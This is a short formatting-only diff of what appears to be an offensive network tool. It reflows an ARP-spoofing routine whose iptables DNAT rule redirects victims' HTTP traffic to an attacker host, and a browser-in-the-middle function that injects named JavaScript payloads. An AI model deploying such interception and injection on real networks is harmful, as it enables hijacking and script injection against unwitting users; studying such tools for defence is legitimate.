@@ -440,8 +440,19 @@ def _start_arpspoof(
     try:
         subprocess.run(
             [
-                "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp",
-                "--dport", "80", "-j", "DNAT", "--to-destination", f"{lhost}:{lport}",
+                "iptables",
+                "-t",
+                "nat",
+                "-A",
+                "PREROUTING",
+                "-p",
+                "tcp",
+                "--dport",
+                "80",
+                "-j",
+                "DNAT",
+                "--to-destination",
+                f"{lhost}:{lport}",
             ],
             capture_output=True,
             timeout=5,
@@ -572,7 +583,10 @@ def bitm_inject(payload_name: str) -> dict[str, Any]:
         return {"success": False, "error": "No active BitM attack."}
 
     if payload_name not in JS_INJECT_PAYLOADS:
-        return {"success": False, "error": f"Unknown payload: {payload_name}. Available: {list(JS_INJECT_PAYLOADS.keys())}"}
+        return {
+            "success": False,
+            "error": f"Unknown payload: {payload_name}. Available: {list(JS_INJECT_PAYLOADS.keys())}",
+        }
 
     js = _build_js_payload(payload_name, state.lhost, state.lport)
 
